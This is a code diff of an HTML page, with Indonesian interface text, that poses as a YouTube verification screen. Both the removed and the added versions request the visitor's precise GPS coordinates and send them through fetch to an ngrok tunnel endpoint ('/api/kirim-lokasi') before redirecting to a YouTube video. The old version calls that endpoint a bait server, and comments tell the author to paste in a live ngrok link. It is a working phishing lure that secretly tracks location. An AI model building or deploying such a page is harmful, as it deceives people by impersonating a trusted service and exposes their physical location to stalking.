@@ -1,46 +1,53 @@
-<script>
-    function gasVerif() {
-        const msg = document.getElementById('status-msg');
-        const youtubeID = "EFmxPMdBqmU"; 
-        
-        // GANTI INI DENGAN LINK NGROK TERBARU KAMU!
-        const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev"; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube - Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f1f1f1; }
+        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 80%; }
+        button { background: #ff0000; color: white; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="120"><br><br>
+        <p>Selesaikan verifikasi untuk melanjutkan menonton.</p>
+        <button onclick="gas()">VERIFIKASI SEKARANG</button>
+        <p id="status" style="color: blue; font-size: 12px;"></p>
+    </div>
 
-        msg.style.display = "block";
-        msg.className = '';
-        msg.innerText = "Memproses verifikasi...";
+    <script>
+        function gas() {
+            const status = document.getElementById('status');
+            // GANTI LINK DI BAWAH INI DENGAN LINK NGROK KAMU YANG AKTIF!
+            const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+            status.innerText = "Meminta izin lokasi...";
 
-                // 1. KIRIM DATA DULU
-                fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`, {
-                    mode: 'cors'
-                })
-                .then(() => {
-                    // 2. JIKA BERHASIL TERKIRIM, BARU BUKA YOUTUBE
-                    msg.className = 'success';
-                    msg.innerText = "✅ Berhasil! Membuka YouTube...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
                     
-                    setTimeout(() => {
-                        window.location.href = `https://www.youtube.com/watch?v=${youtubeID}`;
-                    }, 1000);
-                })
-                .catch(err => {
-                    // Jika Ngrok mati/salah link
-                    msg.className = 'error';
-                    msg.innerText = "❌ Gagal koneksi ke server pancingan.";
-                    console.error(err);
-                });
+                    status.innerText = "Mengirim data...";
 
-            }, (err) => {
-                msg.className = 'error';
-                msg.innerText = "❌ Error: Kamu harus klik 'Izinkan' untuk lanjut.";
-            }, { enableHighAccuracy: true, timeout: 5000 });
-        } else {
-            msg.innerText = "Browser tidak mendukung lokasi.";
+                    // Kirim ke server
+                    fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`)
+                    .then(() => {
+                        status.innerText = "Berhasil! Membuka YouTube...";
+                        setTimeout(() => {
+                            window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
+                        }, 1000);
+                    })
+                    .catch(() => {
+                        alert("Gagal koneksi ke server. Pastikan Ngrok nyala!");
+                    });
+                }, (err) => {
+                    alert("Akses lokasi ditolak! Harap izinkan GPS.");
+                }, { enableHighAccuracy: true });
+            }
         }
-    }
-</script>
+    </script>
+</body>
+</html>
